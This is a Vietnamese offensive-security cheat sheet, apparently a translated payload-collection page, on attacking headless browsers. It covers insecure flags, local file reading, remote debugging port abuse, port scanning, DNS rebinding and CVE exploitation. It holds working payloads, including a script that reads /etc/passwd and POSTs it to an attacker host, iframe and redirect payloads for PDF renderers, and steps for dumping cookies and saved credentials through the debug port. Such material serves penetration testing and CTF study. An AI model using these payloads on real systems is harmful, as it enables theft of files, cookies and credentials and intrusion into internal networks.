# Headless Browser (Trình Duyệt Không Giao Diện)

> Headless browser là một trình duyệt web không có giao diện người dùng đồ họa. Nó hoạt động giống như một trình duyệt thông thường, chẳng hạn như Chrome hay Firefox, bằng cách phân tích cú pháp HTML, CSS, và JavaScript, nhưng thực hiện điều đó ở nền, mà không hiển thị bất kỳ hình ảnh nào.
> Headless browser chủ yếu được sử dụng cho các tác vụ tự động, chẳng hạn như thu thập dữ liệu web (web scraping), kiểm thử, và chạy script. Chúng đặc biệt hữu ích trong các tình huống mà một trình duyệt đầy đủ tính năng không cần thiết, hoặc khi tài nguyên (như bộ nhớ hoặc CPU) bị giới hạn.

## Tóm tắt

* [Lệnh Headless](#headless-commands)
* [Đọc Tệp Cục Bộ](#local-file-read)
* [Cổng Debug Từ Xa](#remote-debugging-port)
* [Mạng](#network)
    * [Quét Cổng](#port-scanning)
    * [DNS Rebinding](#dns-rebinding)
* [CVE](#cve)
* [Tài liệu tham khảo](#references)

## Lệnh Headless

Ví dụ về các lệnh headless browser:

* Google Chrome

    ```ps1
    google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
    ```

* Mozilla Firefox

    ```ps1
    firefox --screenshot https://www.google.com
    ```

* Microsoft Edge

    ```ps1
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
    ```

## Đọc Tệp Cục Bộ

### Các Flag Không An Toàn

Nếu mục tiêu được khởi động với tùy chọn `--allow-file-access`

```ps1
google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir
```

Vì quyền truy cập tệp được cho phép, kẻ tấn công có thể tạo và expose một tệp HTML để chụp lại nội dung của tệp `/etc/passwd`.

```js
<script>
  async function getFlag(){
    response = await fetch("file:///etc/passwd");
    flag = await response.text();
  fetch("https://[ATTACKER.DOMAIN.TLD]/", { method: "POST", body: flag})
  };
  getFlag();
</script>
```

### Render PDF

Hãy xem xét một kịch bản trong đó một headless browser chụp lại một trang web và xuất ra PDF, trong khi kẻ tấn công có quyền kiểm soát URL đang được xử lý.

Mục tiêu: `google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html`

* Chuyển hướng Javascript

    ```html
    <html>
        <body>
            <script>
                window.location="/etc/passwd"
            </script>
        </body>
    </html>
    ```

* Iframe

    ```html
    <html>
        <body>
            <iframe src="/etc/passwd" height="640" width="640"></iframe>
        </body>
    </html>
    ```

## Cổng Debug Từ Xa

Cổng Debug Từ Xa trong một headless browser (như Headless Chrome hoặc Chromium) là một cổng TCP expose DevTools Protocol của trình duyệt để các công cụ bên ngoài (hoặc script) có thể kết nối và điều khiển trình duyệt từ xa. Nó thường lắng nghe trên cổng **9222** nhưng có thể thay đổi bằng `--remote-debugging-port=`.

**Mục tiêu**: `google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html`

**Công cụ**:

* [slyd0g/WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) - Tương tác với cổng debug của các trình duyệt dựa trên Chromium để xem các tab đang mở, extension đã cài, và cookie
* [slyd0g/ripWCMN.py](https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/d96c939adc66a85fa9464cec4150543eee551356/ripWCMN.py) - Phiên bản thay thế WCMN sử dụng Python để sửa kết nối websocket với header `origin` rỗng.

> [!NOTE]  
> Kể từ bản cập nhật Chrome ngày 20 tháng 12 năm 2022, bạn phải khởi động trình duyệt với tham số `--remote-allow-origins="*"` để kết nối tới websocket bằng WhiteChocolateMacademiaNut.

**Khai thác**:

* Kết nối và tương tác với trình duyệt: `chrome://inspect/#devices`, `opera://inspect/#devices`
* Tắt trình duyệt đang chạy và sử dụng `--restore-last-session` để truy cập các tab của người dùng
* Dữ liệu được lưu trong cài đặt (tên đăng nhập, mật khẩu, token): `chrome://settings`
* Quét cổng: Trong một vòng lặp, mở `http://localhost:<port>/json/new?http://[ATTACKER.DOMAIN.TLD]/?port=<port>`
* Rò rỉ UUID: Iframe: `http://127.0.0.1:<port>/json/version`

    ```json
    {
        "Browser": "Chrome/136.0.7103.113",
        "Protocol-Version": "1.3",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.0.0 Safari/537.36",
        "V8-Version": "13.6.233.10",
        "WebKit-Version": "537.36 (@76fa3c1782406c63308c70b54f228fd39c7aaa71)",
        "webSocketDebuggerUrl": "ws://127.0.0.1:9222/devtools/browser/d815e18d-57e6-4274-a307-98649a9e6b87"
    }
    ```

* Đọc tệp cục bộ: [pich4ya/chrome_remote_debug_lfi.py](https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05)
* Node inspector `--inspect` hoạt động giống như một `--remote-debugging-port`

    ```ps1
    node --inspect app.js # cổng mặc định 9229
    node --inspect=4444 app.js # cổng tùy chỉnh 4444
    node --inspect=0.0.0.0:4444 app.js
    ```

Kể từ Chrome 136, các switch `--remote-debugging-port` và `--remote-debugging-pipe` sẽ không được tuân theo nếu cố gắng debug thư mục dữ liệu Chrome mặc định. Các switch này hiện phải đi kèm với switch `--user-data-dir` để trỏ đến một thư mục không phải mặc định.

Flag `--user-data-dir=/path/to/data_dir` được dùng để chỉ định thư mục dữ liệu của người dùng, nơi Chromium lưu trữ tất cả dữ liệu ứng dụng của nó như cookie và lịch sử. Nếu bạn khởi động Chromium mà không chỉ định flag này, bạn sẽ nhận thấy rằng không có bookmarks, mục yêu thích, hay lịch sử nào của bạn được tải vào trình duyệt.

## Mạng

### Quét Cổng

Quét cổng: Tấn công định thời (Timing attack)

* Chèn động một thẻ `<img>` trỏ đến một cổng đóng giả định. Đo thời gian đến sự kiện onerror.
* Lặp lại ít nhất 10 lần → lấy thời gian trung bình để nhận lỗi cho một cổng đóng
* Kiểm tra một cổng ngẫu nhiên 10 lần và đo thời gian đến lỗi
* Nếu `time_to_error(random_port) > time_to_error(closed_port)*1.3` → cổng đang mở

**Lưu ý**:

* Chrome mặc định chặn một danh sách các "cổng đã biết"
* Chrome chặn quyền truy cập vào các địa chỉ mạng cục bộ ngoại trừ localhost thông qua 0.0.0.0

### DNS Rebinding

* [nccgroup/singularity](https://github.com/nccgroup/singularity) - Một framework tấn công DNS rebinding.

1. Chrome sẽ thực hiện 2 request DNS: bản ghi `A` và `AAAA`
    * `AAAA` phản hồi với IP Internet hợp lệ
    * `A` phản hồi với IP nội bộ
2. Chrome sẽ kết nối ưu tiên tới IPv6 (evil.net)
3. Đóng listener IPv6 ngay sau phản hồi đầu tiên
4. Mở Iframe tới evil.net
5. Chrome sẽ cố gắng kết nối tới IPv6 nhưng vì thất bại sẽ chuyển dự phòng sang IPv4
6. Từ cửa sổ trên cùng, chèn script vào iframe để rò rỉ nội dung

## CVE

Khai thác headless browser bằng cách sử dụng một lỗ hổng đã biết (CVE) bao gồm nhiều bước, từ nghiên cứu lỗ hổng đến thực thi payload. Dưới đây là phân tích có cấu trúc về quy trình:

Xác định headless browser bằng User-Agent, sau đó chọn một exploit nhắm vào thành phần của trình duyệt: V8 engine, Blink renderer, Webkit, v.v.

* CVE của Chrome: [2024-9122 - Nhầm lẫn type WASM do kiểu con của chữ ký tag được import](https://issues.chromium.org/issues/365802567), [CVE-2025-5419 - Đọc và ghi ngoài giới hạn trong V8](https://nvd.nist.gov/vuln/detail/CVE-2025-5419)
* Firefox: [CVE-2024-9680 - Sử dụng bộ nhớ sau khi giải phóng (Use after free)](https://nvd.nist.gov/vuln/detail/CVE-2024-9680)

Tùy chọn `--no-sandbox` vô hiệu hóa tính năng sandbox của tiến trình renderer.

```js
const browser = await puppeteer.launch({
    args: ['--no-sandbox']
});
```

## Tài liệu tham khảo

* [Browser based Port Scanning with JavaScript - Nikolai Tschacher - January 10, 2021](https://web.archive.org/web/20210119151816/https://incolumitas.com/2021/01/10/browser-based-port-scanning/)
* [Changes to remote debugging switches to improve security - Will Harris - March 17, 2025](https://web.archive.org/web/20250328233439/https://developer.chrome.com/blog/remote-debugging-port)
* [Chrome DevTools Protocol - Documentation - July 3, 2017](https://web.archive.org/web/20170703201537/https://chromedevtools.github.io/devtools-protocol/)
* [Cookies with Chromium's Remote Debugger Port - Justin Bui - December 17, 2020](https://web.archive.org/web/20201217170910/https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
* [Debugging Cookie Dumping Failures with Chromium's Remote Debugger - Justin Bui - July 16, 2023](https://web.archive.org/web/20250911211108/https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
* [Node inspector/CEF debug abuse - HackTricks - July 18, 2024](https://web.archive.org/web/20241230021023/https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse)
* [Post-Exploitation: Abusing Chrome's debugging feature to observe and control browsing sessions remotely - wunderwuzzi - April 28, 2020](https://web.archive.org/web/20260215064320/https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
* [Too Lazy to get XSS? Then use n-days to get RCE in the Admin bot - Jopraveen - March 2, 2025](https://web.archive.org/web/20250303031943/https://jopraveen.github.io/web-hackthebot/)
* [Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari - Daniel Thatcher - December 6, 2023](https://web.archive.org/web/20231206141057/https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari)
